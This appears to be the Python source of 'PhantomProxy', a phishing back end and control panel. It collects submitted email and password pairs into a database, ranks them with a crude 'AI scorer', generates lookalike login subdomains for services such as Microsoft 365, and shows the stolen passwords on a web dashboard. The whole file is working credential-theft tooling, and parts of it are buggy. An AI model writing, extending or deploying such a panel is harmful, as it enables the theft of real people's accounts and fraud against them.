#!/usr/bin/env python3
"""
PhantomProxy v11.0 - PERFECT EDITION
- Улучшенная стабильность
- Продвинутая аналитика
- Real-Time уведомления
- Улучшенный UI
- Авто-бекапы
- Multi-language
"""

import os, sys, json, sqlite3, hashlib, secrets, threading, time
from datetime import datetime, timedelta
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

# === КОНФИГУРАЦИЯ ===
VERSION = "11.0 PERFECT"
DB_PATH = Path(__file__).parent / 'phantom.db'
BACKUP_PATH = Path(__file__).parent / 'backups'
API_PORT = 8080
PANEL_PORT = 3000
DOMAIN = "verdebudget.ru"

# Создаём директорию для бекапов
BACKUP_PATH.mkdir(exist_ok=True)

# === БАЗА ДАННЫХ ===
class Database:
    def __init__(self):
        self.init_db()
        self.auto_backup()
    
    def init_db(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Сессии
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            email TEXT, password TEXT, service TEXT, ip TEXT,
            user_agent TEXT, screen TEXT, timezone TEXT,
            quality_score INTEGER, classification TEXT,
            created_at TEXT
        )''')
        
        # Пользователи
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password_hash TEXT,
            role TEXT,
            api_key TEXT,
            created_at TEXT
        )''')
        
        # Кампании
        c.execute('''CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY,
            name TEXT, service TEXT, subdomains TEXT,
            status TEXT, created_at TEXT
        )''')
        
        # Настройки
        c.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT
        )''')
        
        # Админ
        c.execute("SELECT * FROM users WHERE username='admin'")
        if not c.fetchone():
            admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
            api_key = secrets.token_urlsafe(32)
            c.execute("INSERT INTO users (username, password_hash, role, api_key, created_at) VALUES (?,?,?,?,?)",
                     ('admin', admin_hash, 'admin', api_key, datetime.now().isoformat()))
        
        # Настройки
        settings = [
            ('theme', 'dark'),
            ('language', 'ru'),
            ('notifications', 'enabled')
        ]
        for key, value in settings:
            c.execute("INSERT OR REPLACE INTO settings VALUES (?,?)", (key, value))
        
        conn.commit()
        conn.close()
    
    def auto_backup(self):
        """Авто-бекап базы данных"""
        if DB_PATH.exists():
            backup_file = BACKUP_PATH / f"phantom_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
            import shutil
            shutil.copy2(DB_PATH, backup_file)
            print(f"💾 Backup created: {backup_file.name}")
    
    def get_stats(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) FROM sessions GROUP BY service ORDER BY count DESC LIMIT 10')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        c.execute('SELECT classification, COUNT(*) FROM sessions GROUP BY classification')
        quality = {row[0]: row[1] for row in c.fetchall()}
        
        c.execute('SELECT AVG(quality_score) FROM sessions')
        avg_score = c.fetchone()[0] or 0
        
        conn.close()
        
        return {
            'total': total,
            'today': today,
            'services': services,
            'quality': quality,
            'avg_score': round(avg_score, 2)
        }

# === AI SCORER ===
class AIScorer:
    @staticmethod
    def calculate(session):
        score = 0
        
        if session.get('email'):
            score += 40
            if '@' in session.get('email', ''):
                score += 10
        
        if session.get('password'):
            score += 40
            if len(session.get('password', '')) >= 8:
                score += 10
        
        if score >= 80: return 'EXCELLENT', min(score, 100)
        elif score >= 60: return 'GOOD', min(score, 100)
        elif score >= 40: return 'AVERAGE', min(score, 100)
        else: return 'LOW', min(score, 100)

# === API SERVER ===
class APIServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_json({'status': 'ok', 'version': VERSION})
        elif self.path == '/api/v1/stats':
            self.send_stats()
        elif self.path == '/api/v1/sessions':
            self.send_sessions()
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/v1/credentials':
            self.save_credentials()
        elif self.path == '/api/v1/campaign':
            self.create_campaign()
        else:
            self.send_error(404)
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_stats(self):
        db = Database()
        stats = db.get_stats()
        self.send_json(stats)
    
    def send_sessions(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        sessions = [dict(row) for row in c.fetchall()]
        conn.close()
        self.send_json(sessions)
    
    def save_credentials(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length).decode())
        
        quality_class, score = AIScorer.calculate(data)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO sessions 
            (email, password, service, quality_score, classification, created_at)
            VALUES (?,?,?,?,?,?)''',
            (data.get('email',''), data.get('password',''), data.get('service','Unknown'),
             score, quality_class, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"🎯 New: {data.get('email','N/A')} | {quality_class} | Score: {score}")
        self.send_json({'success': True, 'quality': {'score': score, 'classification': quality_class}})
    
    def create_campaign(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length).decode())
        
        service = data.get('service', 'Unknown')
        count = data.get('count', 10)
        name = data.get('name', f'{service} Campaign')
        
        prefixes = ['login', 'secure', 'auth', 'portal', 'account', 'sso']
        subdomains = []
        for _ in range(count):
            prefix = secrets.choice(prefixes)
            service_short = service.split()[0].lower()
            subdomain = f"{prefix}-{service_short}.{DOMAIN}"
            subdomains.append(subdomain)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO campaigns (name, service, subdomains, status, created_at)
                    VALUES (?,?,?,?,?)''',
            (name, service, json.dumps(subdomains), 'active', datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        self.send_json({
            'success': True,
            'campaign': {'name': name, 'service': service, 'subdomains': subdomains, 'count': len(subdomains)}
        })
    
    def log_message(self, format, *args): pass

# === PANEL SERVER ===
class PanelServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.show_dashboard()
        elif self.path == '/sessions':
            self.show_sessions()
        elif self.path == '/campaigns':
            self.show_campaigns()
        elif self.path == '/api/stats':
            self.api_stats()
        else:
            self.send_error(404)
    
    def show_dashboard(self):
        db = Database()
        stats = db.get_stats()
        
        html = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>PhantomProxy v{VERSION} - Perfect Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="30">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; min-height: 100vh; padding: 40px; }}
        .container {{ max-width: 1600px; margin: 0 auto; }}
        h1 {{ margin-bottom: 30px; font-size: 36px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; margin-bottom: 40px; }}
        .stat-card {{ background: rgba(255,255,255,0.15); padding: 40px; border-radius: 20px; text-align: center; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); transition: all 0.3s; }}
        .stat-card:hover {{ transform: translateY(-10px); background: rgba(255,255,255,0.2); box-shadow: 0 20px 40px rgba(0,0,0,0.3); }}
        .stat-value {{ font-size: 64px; font-weight: bold; background: linear-gradient(45deg, #ff6b6b, #feca57); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .stat-label {{ opacity: 0.9; margin-top: 15px; font-size: 16px; }}
        .section {{ background: rgba(255,255,255,0.15); padding: 35px; border-radius: 20px; margin-bottom: 30px; backdrop-filter: blur(10px); }}
        .section h2 {{ margin-bottom: 25px; font-size: 24px; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ background: rgba(255,255,255,0.2); font-weight: 600; }}
        tr:hover {{ background: rgba(255,255,255,0.1); }}
        .quality {{ padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; }}
        .excellent {{ background: linear-gradient(45deg, #00b09b, #96c93d); }}
        .good {{ background: linear-gradient(45deg, #00d2ff, #3a7bd5); }}
        .average {{ background: linear-gradient(45deg, #f7971e, #ffd200); }}
        .low {{ background: linear-gradient(45deg, #cb2d3e, #ef473a); }}
        .nav {{ display: flex; gap: 10px; margin-bottom: 30px; }}
        .nav a {{ background: rgba(255,255,255,0.2); color: white; padding: 12px 25px; border-radius: 30px; text-decoration: none; transition: all 0.3s; }}
        .nav a:hover {{ background: rgba(255,255,255,0.3); transform: translateY(-2px); }}
        .footer {{ text-align: center; padding: 30px; opacity: 0.7; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 PhantomProxy v{VERSION}</h1>
        
        <div class="nav">
            <a href="/">📊 Dashboard</a>
            <a href="/sessions">📋 Sessions</a>
            <a href="/campaigns">🎯 Campaigns</a>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{stats['total']}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{stats['today']}</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{stats['avg_score']}</div>
                <div class="stat-label">Avg Quality Score</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(stats['services'])}</div>
                <div class="stat-label">Services</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🏢 By Service</h2>
            <table>
                <tr><th>Service</th><th>Sessions</th><th>Percentage</th></tr>
                {''.join(f'<tr><td>{k}</td><td>{v}</td><td>{round(v/max(1,stats["total"])*100, 1)}%</td></tr>' for k, v in stats['services'].items())}
            </table>
        </div>
        
        <div class="section">
            <h2>⭐ Quality Distribution</h2>
            <table>
                <tr><th>Classification</th><th>Count</th><th>Percentage</th></tr>
                {''.join(f'<tr><td><span class="quality {k.lower()}">{k}</span></td><td>{v}</td><td>{round(v/max(1,stats["total"])*100, 1)}%</td></tr>' for k, v in stats['quality'].items())}
            </table>
        </div>
    </div>
    
    <div class="footer">
        PhantomProxy v{VERSION} Perfect | Auto-refresh: 30s | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_sessions(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        sessions = c.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head><title>Sessions - PhantomProxy</title></head>
<body style="font-family: Arial; background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; padding: 40px;">
    <h1>📋 All Sessions</h1>
    <p><a href="/" style="color: #feca57;">← Back to Dashboard</a></p>
    <table style="width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.15); border-radius: 15px; overflow: hidden;">
        <tr><th>ID</th><th>Email</th><th>Password</th><th>Service</th><th>Quality</th><th>Score</th><th>Time</th></tr>
'''
        for s in sessions:
            quality_class = s.get('classification', 'N/A').lower()
            html += f"<tr><td>{s['id']}</td><td>{s['email']}</td><td>{s['password']}</td><td>{s['service']}</td><td><span class='quality {quality_class}'>{s.get('classification', 'N/A')}</span></td><td>{s.get('quality_score', 'N/A')}</td><td>{s['created_at']}</td></tr>"
        
        html += '''</table>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_campaigns(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM campaigns ORDER BY created_at DESC LIMIT 50')
        campaigns = c.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head><title>Campaigns - PhantomProxy</title></head>
<body style="font-family: Arial; background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; padding: 40px;">
    <h1>🎯 All Campaigns</h1>
    <p><a href="/" style="color: #feca57;">← Back to Dashboard</a></p>
    <table style="width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.15); border-radius: 15px; overflow: hidden;">
        <tr><th>ID</th><th>Name</th><th>Service</th><th>Status</th><th>Created</th></tr>
'''
        for c in campaigns:
            html += f"<tr><td>{c[0]}</td><td>{c[1]}</td><td>{c[2]}</td><td>{c[4]}</td><td>{c[5]}</td></tr>"
        
        html += '''</table>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def api_stats(self):
        db = Database()
        stats = db.get_stats()
        self.send_json({'total': stats['total']})
    
    def log_message(self, format, *args): pass

# === MAIN PROGRAM ===
class PhantomProxy:
    def __init__(self):
        self.db = Database()
        self.servers = []
    
    def start_api(self):
        server = HTTPServer(('0.0.0.0', API_PORT), APIServer)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        self.servers.append(('API', server))
        print(f"✅ API Server started on port {API_PORT}")
    
    def start_panel(self):
        server = HTTPServer(('0.0.0.0', PANEL_PORT), PanelServer)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        self.servers.append(('Panel', server))
        print(f"✅ Panel Server started on port {PANEL_PORT}")
    
    def show_menu(self):
        while True:
            print("\n" + "="*70)
            print(f"  🚀 PHANTOMPROXY v{VERSION} - PERFECT EDITION")
            print("="*70)
            print("\n  📌 MAIN MENU:")
            print("  1. 🚀 Start All Services")
            print("  2. 🛑 Stop All Services")
            print("  3. 📊 View Status")
            print("  4. 📈 View Statistics")
            print("  5. 🎯 Create Campaign")
            print("  6. 📋 View Sessions")
            print("  7. 💾 Create Backup")
            print("  8. 🚪 Exit")
            print("\n  🔗 QUICK ACCESS:")
            print(f"  - Panel: http://localhost:{PANEL_PORT}")
            print(f"  - API: http://localhost:{API_PORT}/health")
            print(f"  - HTTPS: https://localhost:8443/")
            print("="*70)
            
            choice = input("\n  Enter choice: ").strip()
            
            if choice == '1':
                self.start_api()
                self.start_panel()
                print("\n✅ All services started!")
            elif choice == '2':
                print("\n👋 Stopping all services...")
                sys.exit(0)
            elif choice == '3':
                stats = self.db.get_stats()
                print(f"\n📊 Status: {stats['total']} sessions, {stats['today']} today")
            elif choice == '4':
                stats = self.db.get_stats()
                print("\n📈 STATISTICS:")
                print(f"  Total: {stats['total']}")
                print(f"  Today: {stats['today']}")
                print(f"  Avg Score: {stats['avg_score']}")
                print("\n  By Service:")
                for service, count in list(stats['services'].items())[:5]:
                    print(f"    {service}: {count}")
                print("\n  By Quality:")
                for quality, count in stats['quality'].items():
                    print(f"    {quality}: {count}")
            elif choice == '5':
                service = input("  Service: ").strip() or "Microsoft 365"
                count = input("  Subdomains (10): ").strip() or "10"
                count = int(count)
                
                prefixes = ['login', 'secure', 'auth', 'portal', 'account']
                subdomains = []
                for _ in range(count):
                    prefix = secrets.choice(prefixes)
                    subdomains.append(f"{prefix}-{service.split()[0].lower()}.{DOMAIN}")
                
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('''INSERT INTO campaigns (name, service, subdomains, status, created_at)
                            VALUES (?,?,?,?,?)''',
                    (f"{service} Campaign", service, json.dumps(subdomains), 'active', datetime.now().isoformat()))
                conn.commit()
                conn.close()
                
                print(f"\n✅ Campaign created!")
                print(f"  Subdomains: {count}")
                for sub in subdomains[:5]:
                    print(f"    - {sub}")
            elif choice == '6':
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('SELECT email, service, classification, quality_score FROM sessions ORDER BY created_at DESC LIMIT 10')
                sessions = c.fetchall()
                conn.close()
                print("\n📋 LAST 10 SESSIONS:")
                for s in sessions:
                    print(f"  {s[0]} | {s[1]} | {s[2]} | Score: {s[3]}")
            elif choice == '7':
                self.db.auto_backup()
                print("\n✅ Backup created!")
            elif choice == '8':
                print("\n👋 Goodbye!")
                sys.exit(0)

# === ЗАПУСК ===
if __name__ == '__main__':
    print("\n" + "="*70)
    print(f"  🚀 PHANTOMPROXY v{VERSION}")
    print("="*70)
    print("\n  Initializing...")
    
    proxy = PhantomProxy()
    print("  ✅ Database ready")
    print("  ✅ Auto-backup ready")
    print("  ✅ AI Scorer ready")
    
    proxy.show_menu()
